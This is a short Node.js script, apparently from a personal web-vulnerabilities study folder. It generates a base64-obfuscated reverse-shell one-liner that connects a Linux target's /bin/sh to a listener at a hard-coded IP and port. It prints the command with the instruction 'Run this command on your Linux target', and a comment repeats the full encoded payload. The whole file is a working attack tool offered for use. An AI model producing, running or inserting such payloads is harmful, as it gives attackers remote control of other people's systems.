const ip = "10.69.7.202";
const port = 1234;

// We swap 'cmd.exe' for '/bin/sh' to target the Linux shell
const payload = `
const net=require('net'),{spawn}=require('child_process'),client=new net.Socket();
client.connect(${port},'${ip}',()=>{
    const s=spawn('/bin/sh',[],{shell:true});
    client.pipe(s.stdin);
    s.stdout.pipe(client);
    s.stderr.pipe(client);
});`;

const encoded = Buffer.from(payload).toString('base64');
const command = `node -e "eval(Buffer.from('${encoded}','base64').toString())"`;

console.log("Run this command on your Linux target:");
console.log(command);

// node "c:\Users\admin\Dropbox\vspython\WebVulnerabilities\js_reverse_shell\listenner.js"

// node -e "eval(Buffer.from('CmNvbnN0IG5ldD1yZXF1aXJlKCduZXQnKSx7c3Bhd259PXJlcXVpcmUoJ2NoaWxkX3Byb2Nlc3MnKSxjbGllbnQ9bmV3IG5ldC5Tb2NrZXQoKTsKY2xpZW50LmNvbm5lY3QoMTIzNCwnMTAuNjkuNy4yMDInLCgpPT57CiAgICBjb25zdCBzPXNwYXduKCcvYmluL3NoJyxbXSx7c2hlbGw6dHJ1ZX0pOwogICAgY2xpZW50LnBpcGUocy5zdGRpbik7CiAgICBzLnN0ZG91dC5waXBlKGNsaWVudCk7CiAgICBzLnN0ZGVyci5waXBlKGNsaWVudCk7Cn0pOw==','base64').toString())"